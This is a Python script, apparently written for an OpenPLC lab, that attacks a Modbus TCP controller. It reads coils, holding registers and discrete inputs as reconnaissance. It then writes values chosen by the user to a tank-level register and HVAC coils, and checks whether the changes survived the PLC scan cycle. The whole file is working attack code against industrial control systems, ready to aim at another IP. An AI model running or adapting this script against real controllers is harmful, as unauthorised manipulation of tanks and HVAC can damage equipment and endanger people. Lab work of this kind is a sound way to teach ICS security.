#Feel free to customize the attack by playing with this code
from pymodbus.client import ModbusTcpClient
import time
TARGET = '127.0.0.1'  # Change to OpenPLC IP if on separate machine
PORT = 502
client = ModbusTcpClient(TARGET, port=PORT)
client.connect()
print("=" * 40)
print("ATTACK")
print("=" * 40)
# RECONNAISSANCE(Fancy word for spying) 
print("\n[*] Phase 1: Reconnaissance")
coils = client.read_coils(address=0, count=8)
print(f"    Coils: {coils.bits[:8]}")
regs = client.read_holding_registers(address=0, count=4)
print(f"    Holding Registers: {regs.registers}")
inputs = client.read_discrete_inputs(address=0, count=8)
print(f"    Discrete Inputs: {inputs.bits[:8]}")
time.sleep(1)
# ATTACK 
print("\n[!] Phase 2: Attack")
print("    What do you want to attack?")
print("    1. Tank only")
print("    2. HVAC only")
print("    3. Both")
choice = input("    Enter choice (1/2/3): ")

if choice == '1':
    tank = int(input("Enter tank level to achieve: "))
    client.write_register(address=0, value=tank)
elif choice == '2':
    hvac = int(input("Enter the register no. for manipulation: "))
    val_choice = input("    Enter coil value (1 for True, 0 for False): ") == '1'
    client.write_coil(address=hvac, value=val_choice)
elif choice == '3':
    hvac = int(input("Enter the register no. for manipulation: "))
    val_choice = input("    Enter coil value (1 for True, 0 for False): ") == '1'
    tank = int(input("Enter tank level to achieve: "))
    client.write_coil(address=hvac, value=val_choice)
    client.write_register(address=0, value=tank)
else:
    print("    Invalid choice. Exiting.")
    client.close()
    exit()

# Verify attack landed
coil_check = client.read_coils(address=hvac if choice in ['2','3'] else 0, count=1)
reg_check = client.read_holding_registers(address=0, count=1)
if choice == '1':
    if reg_check.registers[0] == tank:
        print("    [+] Attack successful and values modified")
    else:
        print("    [-] Attack may have been overwritten by PLC scan cycle")
elif choice == '2':
    if coil_check.bits[0] == val_choice:
        print("    [+] Attack successful and values modified")
    else:
        print("    [-] Attack may have been overwritten by PLC scan cycle")
elif choice == '3':
    if coil_check.bits[0] == val_choice and reg_check.registers[0] == tank:
        print("    [+] Attack successful and values modified")
    else:
        print("    [-] Attack may have been overwritten by PLC scan cycle")
# AFTER ATTACK VALUE
print("\n[*] Phase 3: Verify")
regs_after = client.read_holding_registers(address=0, count=4)
coils_after = client.read_coils(address=0, count=8)
print(f"    Holding Registers AFTER: {regs_after.registers}")
print(f"    Coils AFTER: {coils_after.bits[:8]}")
client.close()
print("\n    WORK DONE ")
